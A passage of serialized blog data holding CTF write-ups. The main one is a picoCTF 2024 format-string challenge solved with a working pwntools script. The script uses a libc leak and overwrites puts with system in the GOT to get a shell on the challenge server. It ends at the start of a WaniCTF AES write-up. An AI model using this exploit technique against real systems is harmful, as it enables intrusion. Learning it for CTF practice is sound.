style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> _IONBF\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 0\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">\tsetvbuf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(stdout\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\"> NULL\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> _IONBF\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 0\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">\tsetvbuf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(stderr\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\"> NULL\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> _IONBF\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 0\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">void\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> hello\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">\tputs\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Howdy gamers!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">\tprintf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Okay I'll be nice. Here's the address of setvbuf in libc: \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">%p\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\"> &#x26;\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">setvbuf)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">int\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> main\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">\tchar\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\"> *\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\">all_strings\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[MAX_STRINGS] \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">NULL\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">};\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">\tchar\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> buf\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">1024\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">] \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\0\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">};\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">\tsetup\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">\thello\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\t\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">\tfgets\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(buf\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 1024\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> stdin)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\t\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">\tprintf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(buf)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">\tputs\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(normal_string)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">\treturn\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 0\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>hmm… interesting. It says it gives the address of \u003Ccode>setvbuf\u003C/code> in libc, and it does the \u003Ccode>puts\u003C/code>function with \u003Ccode>normal_string\u003C/code>, with \u003Ccode>normal_string\u003C/code> being \u003Ccode>/bin/sh\u003C/code>.\u003C/p>\n\u003Cp>After a bit of research, it appears we need to overwrite the address of \u003Ccode>puts()\u003C/code> with \u003Ccode>system()\u003C/code>, so we can pop a shell to access the server. However, there’s a huge problem. How do we even get \u003Ccode>system()\u003C/code>???\u003C/p>\n\u003Cp>Getting \u003Ccode>puts\u003C/code> is easy. It’s in the Global Offset Table (GOT), so we don’t really need to worry about that.\u003C/p>\n\u003Cp>We can try to find system() in libc, however there’s a huge problem. The binary has ASLR.\u003C/p>\n\u003Cp>ASLR stands for Address Space Layout Randomisation and can, in most cases, be thought of as libc’s equivalent of PIE - every time you run a binary, libc (and other libraries) get loaded into a different memory address.\u003C/p>\n\u003Cp>This is a problem. How can we get address of \u003Ccode>system()\u003C/code> if we can’t even get a constant address for \u003Ccode>system()\u003C/code> in libc???\u003C/p>\n\u003Cp>This is where the leak of \u003Ccode>setvbuf\u003C/code> in libc comes in.\u003C/p>\n\u003Cp>We can caculate the base address of libc by subtracting the leaked address of \u003Ccode>setvbuf\u003C/code> by the offset of \u003Ccode>setvbuf\u003C/code> in libc.\u003C/p>\n\u003Cp>Ok, so with that we can add the offset of \u003Ccode>system\u003C/code> in libc to the base address. So we are able to get \u003Ccode>system\u003C/code>, nice!\u003C/p>\n\u003Cp>Heres the steps of our exploit:\u003C/p>\n\u003Col>\n\u003Cli>subtract leaked setvbuf by setvbuf offset in libc to get libc base address\u003C/li>\n\u003Cli>add offset of system in libc to the base address to get the address of system\u003C/li>\n\u003Cli>get the address of puts in the GOT and replace it with the address of system using format string\u003C/li>\n\u003Cli>use pwntools to automate this process\u003C/li>\n\u003Cli>log in and get flag!\u003C/li>\n\u003C/ol>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> pwn \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> *\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> pwnlib\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">fmtstr \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> FmtStr\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> fmtstr_payload\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> fmtstr_split\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">elf \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> context\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">binary \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> ELF\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">./format-string-3\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">libc \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> ELF\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">./libc.so.6\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">get base address from setvbuf using leaked setvbuf\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> args\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#82AAFF\">REMOTE\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">\tp \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> remote\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">rhea.picoctf.net\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 61909\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">else\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">\tp \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> process\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">elf.path\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">def\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> send_payload\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\">payload\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">\tp\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">sendline\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">payload\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">\tp\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">interactive\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">p.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">recvline\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">())\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">system_leak \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> int\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">((p.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">recvline\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">()\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">).\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">split\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">()\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">[\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">11\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">]\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 16\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">(system_leak)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">get the libc.address through system leak\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">libc_address \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (system_leak\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">-\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">libc\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">symbols\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">setvbuf\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">]\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">system \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (libc_address \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> libc\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">symbols\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">system\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">]\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">payload \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> fmtstr_payload\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">38\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> {elf.got\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">puts\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">]\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: system}\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">p\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">sendline\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">payload\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">p\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">interactive\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cimg src=\"/img/writeups/2024/picoCTF2024/formatstring03.png\" alt=\"Image of exploit success\">\u003C/p>\n\u003Cp>And… we get the flag!\u003C/p>",{"headings":211,"imagePaths":223,"frontmatter":199},[212,213,214,217,220],{"depth":26,"slug":27,"text":28},{"depth":30,"slug":62,"text":63},{"depth":65,"slug":215,"text":216},"format-string-2","Format String 2",{"depth":65,"slug":218,"text":219},"heap-3","Heap 3",{"depth":65,"slug":221,"text":222},"format-string-3","Format String 3",[],"wanictf",{"id":224,"data":226,"body":232,"filePath":233,"digest":234,"rendered":235},{"author":12,"pubDatetime":227,"modDatetime":228,"title":229,"tags":230,"description":231},["Date","2022-03-23T15:22:00.000Z"],["Date","2023-12-21T09:12:47.400Z"],"wanictf 2024 challenges",[51],"Solutions I did for WaniCTF 2024","\n# Background Information\nI went to this competition as perpendicular pineapples. Could only do some of the challenges, which were mostly the beginner ones.\n\n## Cryptography\n\n#### Beginner AES\n\n> AES is one of the most important encryption methods in our daily lives.\n\nLet's look at the provided code that encrypts the flag.\n\n```python\n# https://pycryptodome.readthedocs.io/en/latest/src/cipher/aes.html\nfrom Crypto.Util.Padding import pad\nfrom Crypto.Cipher import AES\nfrom os import urandom\nimport hashlib\n\nkey = b'the_enc_key_is_'\niv = b'my_great_iv_is_'\nkey += urandom(1)\niv += urandom(1)\n\ncipher = AES.new(key, AES.MODE_CBC, iv)\nFLAG = b'FLAG{This_is_a_dummy_flag}'\nflag_hash = hashlib.sha256(FLAG).hexdigest()\n\nmsg = pad(FLAG, 16)\nenc = cipher.encrypt(msg)\n\nprint(f'enc = {enc}') # bytes object\nprint(f'flag_hash = {flag_hash}') # str object\n```\n\nSo we can see that the last character in both key and iv are random, and we can also see that the flag is encrypted using AES. \n\nWe are also provide a `out.txt` file, which has the encrypted flag as well as the hash of the flag\n\n```bash\nenc = 